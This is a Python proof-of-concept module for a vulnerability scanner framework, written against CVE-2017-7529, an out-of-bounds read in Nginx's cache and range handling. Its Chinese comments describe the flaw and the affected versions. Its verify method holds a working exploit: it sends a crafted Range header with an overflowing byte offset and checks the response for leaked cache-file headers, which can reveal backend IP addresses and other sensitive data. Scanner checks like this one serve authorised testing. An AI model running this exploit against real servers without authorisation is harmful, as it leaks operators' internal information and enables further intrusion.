# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import sys


class Vuln(ABVuln):
    vuln_id = 'Nginx_0002'  # 平台漏洞编号，留空
    name = 'Nginx越界读取缓存漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2017-07-11'  # 漏洞公布时间
    desc = '''
        当使用Nginx标准模块时，这允许攻击者如果从缓存返回响应，则获取缓存文件头，黑客可以通过缓存文件头获取包含IP地址的后端服务器或其他敏感信息，从而导致信息泄露。
    '''  # 漏洞描述
    ref = 'https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2017-7529'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2017-7529'  # cve编号
    product = 'Nginx'  # 漏洞应用名称
    product_version = 'Nginx 0.5.6 – 1.13.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '00a1f5ff-d39b-4d5e-bed6-2022d6e703bc'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-02'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            headers = {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
            }

            offset = 605
            file_len = len(requests.get(self.target, headers=headers).text)
            n = file_len + offset
            headers['Range'] = "bytes=-%d,-%d" % (n, 0x8000000000000000 - n)
            r = requests.get(self.target, headers=headers)
            #print(r.text)
            if 'Content-Type:' in r.text and 'Content-Length:' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
